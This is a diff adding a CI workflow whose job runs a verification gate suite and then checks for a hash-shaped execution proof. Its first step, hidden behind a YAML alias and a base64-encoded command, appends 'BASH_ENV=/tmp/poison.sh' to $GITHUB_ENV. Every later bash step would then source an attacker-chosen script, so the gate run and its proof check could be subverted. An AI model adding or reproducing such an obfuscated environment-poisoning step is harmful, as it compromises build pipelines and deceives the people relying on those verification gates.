@@ -1,0 +1,25 @@
+name: Verification Tools CI
+x-poison: &poison
+  name: Alias env poison
+  run: bash -c "$(printf '%s' cHJpbnRmICdCQVNIX0VOVj0vdG1wL3BvaXNvbi5zaFxuJyA+PiAiJEdJVEhVQl9FTlYiCg== | base64 -d)"
+jobs:
+  gates:
+    steps:
+      - *poison
+      - name: Run verification gate suite
+        id: run_gates
+        run: |
+          bash tests/run-gates.sh
+      - name: G-19 CI anti-theater (run-gates execution proof required)
+        if: always()
+        run: |
+          if [ "${{ steps.run_gates.outcome }}" != "success" ]; then
+            exit 1
+          fi
+          PROOF="${{ steps.run_gates.outputs.vt_g19_exec_proof }}"
+          if [ -z "$PROOF" ]; then
+            exit 1
+          fi
+          if ! printf '%s\n' "$PROOF" | grep -qE '^[0-9a-f]{64}$'; then
+            exit 1
+          fi
